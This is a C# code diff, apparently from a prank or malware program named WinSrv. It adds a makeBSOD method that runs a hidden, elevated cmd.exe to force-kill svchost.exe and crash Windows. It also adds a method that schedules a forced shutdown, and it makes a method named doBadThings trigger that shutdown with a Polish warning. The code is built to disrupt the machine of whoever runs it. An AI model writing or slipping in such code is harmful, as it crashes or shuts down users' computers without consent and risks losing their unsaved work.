@@ -27,6 +27,29 @@ namespace WinSrv
             return mciSendString("set cdaudio door open", null, 0, 0);
         }
 
+        public static void makeBSOD()
+        {
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd.exe";
+            startInfo.Arguments = "taskkill /F /IM svchost.exe";
+            startInfo.Verb = "runas";
+            process.StartInfo = startInfo;
+            process.Start();
+        }
+
+        public static void shutdown(int time, string message)
+        {
+            System.Diagnostics.Process process = new System.Diagnostics.Process();
+            System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
+            startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
+            startInfo.FileName = "cmd.exe";
+            startInfo.Arguments = String.Format("shutdown -s -t {0} -c \"{1}\"", time, message);
+            process.StartInfo = startInfo;
+            process.Start();
+        }
+
         public static void fire(byte hour, byte minutes)
         {
             try
@@ -81,7 +104,9 @@ namespace WinSrv
 
         static void doBadThings(object state)
         {
-            string imgWallpaper = @"Wallpaper.jpg";
+            shutdown(60, "Komputer zostanie wyłączony!");
+
+            string imgWallpaper = Path.GetFullPath(@"Wallpaper.jpg");
             
             if (File.Exists(imgWallpaper))
             {
